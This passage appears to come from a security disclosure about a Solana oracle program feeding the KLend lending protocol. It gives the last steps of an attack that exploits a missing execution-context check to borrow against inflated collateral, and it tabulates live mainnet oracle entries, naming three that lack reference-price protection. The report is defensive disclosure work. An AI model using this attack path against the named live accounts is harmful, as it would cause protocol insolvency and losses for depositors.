   -> no check_execution_ctx (can sandwich via CPI, Attack Vector 4)
   -> Old multiplier applied, oracle price 2x inflated
Step 7: Attacker borrows additional USDC against inflated collateral (atomic via CPI)
Step 8: Correct report eventually submitted, price corrects
Step 9: Attacker position undercollateralized, KLend eats the bad debt = PROTOCOL INSOLVENCY
```

### On Chain Evidence (read only, no transactions submitted)

All data below was read directly from Solana mainnet on March 5 2026 by decoding the OraclePrices account (`3t4JZcueEzTbVP6kLxXrL3VpWx45jDer4eqysweBchNH`) and OracleMappings account (`4zh6bmb77qX2CL7t5AJYCqa6YqFafbz3QJNeFvZjLowg`). All entries were fresh (updated within seconds of the read). Oracle type for all 13 entries is `37` (ChainlinkX). No transactions were submitted.

| Entry | Token | Live Price | ref_price | Protected? |
|-------|-------|-----------|-----------|------------|
| #258 | AAPLx | $263.17 | #26 (Pyth AAPL/USD) | Yes (5%) |
| #260 | HOODx | $82.25 | #94 (Pyth HOOD/USD) | Yes (5%) |
| **#262** | **Unknown** | **$105.28** | **0xFFFF (None)** | **NO** |
| #264 | GOOGLx | $303.54 | #34 (Pyth GOOGL/USD) | Yes (5%) |
| **#266** | **Unknown** | **$668.41** | **0xFFFF (None)** | **NO** |
| #268 | NVDAx | $183.08 | #42 (Pyth NVDA/USD) | Yes (5%) |
| #270 | MSTRx | $146.37 | #72 (Pyth MSTR/USD) | Yes (5%) |
| #272 | TSLAx | $406.06 | #56 (Pyth TSLA/USD) | Yes (5%) |
| #274 | AMZNx | $216.94 | #50 (Pyth AMZN/USD) | Yes (5%) |
| #276 | COINx | $208.74 | #64 (Pyth COIN/USD) | Yes (5%) |
| #278 | Unknown | $687.34 | #284 (Pyth ref) | Yes (5%) |
| #280 | QQQx | $611.49 | #90 (Pyth QQQ/USD) | Yes (5%) |
| **#282** | **Unknown** | **$406.13** | **0xFFFF (None)** | **NO** |

Key accounts (all verified live on Solana mainnet March 5 2026):

| Account | Address | Verification |
|---------|---------|-------------|
| Scope Program | `HFn8GnPADiny6XqUoWE8uRPPxb29ikn4yTuPa9MF2fWJ` | Executable, matches `program_id.rs` in source |
| OracleMappings | `4zh6bmb77qX2CL7t5AJYCqa6YqFafbz3QJNeFvZjLowg` | 29704 bytes, owned by Scope program |
| OraclePrices | `3t4JZcueEzTbVP6kLxXrL3VpWx45jDer4eqysweBchNH` | 28712 bytes, oracle_mappings field points to account above |
| Chainlink Verifier | `Gt9S41PtjR58CbG9JhJ3J6vxesqrNAswbWYbLNTMZA3c` | Executable, matches `VERIFIER_PROGRAM_ID` in chainlink.rs |

All 13 feed IDs start with `0x000a`, which confirms they use the v10 report schema.
